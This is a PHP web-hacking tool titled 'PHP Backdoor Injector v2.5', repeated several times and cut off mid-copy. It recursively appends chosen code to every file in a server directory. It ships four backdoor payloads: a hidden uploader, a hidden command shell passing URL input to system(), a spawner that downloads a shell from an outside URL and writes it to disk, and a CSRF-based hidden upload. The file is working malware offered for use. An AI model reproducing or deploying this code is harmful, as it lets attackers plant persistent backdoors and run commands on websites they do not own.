    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'file\' name=\'filena\'> <input type=\'submit\' name=\'upload\' value=\'Upload\'><br>";
if(isset($_POST[\'upload\'])){
  $cwd=getcwd();
  $tmp=$_FILES[\'filena\'][\'tmp_name\'];
  $filena=$_FILES[\'filena\'][\'name\'];
  if(@copy($tmp, $filena)){
    echo "<br>Sukses -> $cwd/$filena";
  }else{
    echo "<br>Gagal -> Permission Denied";
  }
}
}
?>';
}elseif($_POST['payload']=="2"){
$ex='<?php
/* Usage : file.php?74nc0x=[command] */
if(isset($_GET[\'74nc0x\'])){
$x=$_GET[\'74nc0x\'];echo "<pre>";
system($x);
}
?>';
}elseif($_POST['payload']=="3"){
$ex='<?php
/* Shell -> 74nc0x.php */
$cok=\'https://www.mdf.or.id/idx.txt\'; // Link Shell
$fu=file_get_contents("$cok");
$fh=fopen(\'74nc0x.php\',w);
fwrite($fh,"$fu");
fclose($fh);
?>';
}elseif($_POST['payload']=="4"){
$ex='<?php
/* POST file = 74nc0x */
$cwd=getcwd();
$tmp=$_FILES[\'74nc0x\'][\'tmp_name\'];
$filena=$_FILES[\'74nc0x\'][\'name\'];
if(@copy($tmp, $filena)){
  echo "<br>Sukses -> $cwd/$filena";
}
?>';}
$x=htmlspecialchars("$ex");?><title>PHP Backdoor Injector v2.5</title>
<center><body bgcolor='grey'><pre>
<font color='white' size='4'>
<font color='red'>[</font> PHP Backdoor Injector v2.5 <font color='red'>]</font>
<form action='' method='POST'>
Code To Inject

<select name='payload'><option>Select Payload</option><option value='1'>Hidden Uploader</option><option value='2'>Hidden Command Shell</option><option value='3'>Auto Shell Spawner</option><option value='4'>Hidden Upload [CSRF]</option></select> <input type='submit' name='lockp' value='Lock'>

<textarea name='74nc0x' cols='50' rows='15'><?php echo $x;?></textarea>

Dir : <input type='text' name='dir' value='<?php $dir=getcwd();echo "$dir/";?>'>

<input type='submit' name='inject' value='Inject'></form>

Copyright (c) 2018 74NC0X - Sora Cyber Team<?php
/*
        PHP Backdoor Injector v.2.5
    @Author : 74nc0x
    @Github : http://github.com/soracyberteam/
    @Date   : 22/Dec/2018
    Recode? jancuk kon.
*/
function inject($dir,$code){
$scan=scandir($dir);
$base=basename($_SERVER['PHP_SELF']);
foreach($scan as $file){if($file=='.' | $file=='..'){continue;}if($file==$base){continue;}if(is_dir("$dir/$file")){
$new="$dir/$file";
inject($new,$code);
}else{
echo "<body bgcolor='black'><font color='white'>";
$fh=fopen("$dir/$file",a);
if(fwrite($fh,"$code")){echo "[+] $dir/$file --> Success<br>";}else{echo "[-] $dir/$file --> Fail<br>";}
}
}
fclose($fh);
}
if(isset($_POST['inject'])){
$dir=$_POST['dir'];$code=$_POST['74nc0x'];
inject($dir,$code);
echo "<script>";
}
?>
<?php
if($_POST['payload']=="1"){
$ex='<?php
/* Usage : file.php?74nc0x */
if(isset($_GET[\'74nc0x\'])){
echo "gombrus@yahoo.com:~#<br><form action=\'\' enctype=\'multipart/form-data\' method=\'POST\'>
<input type=\'f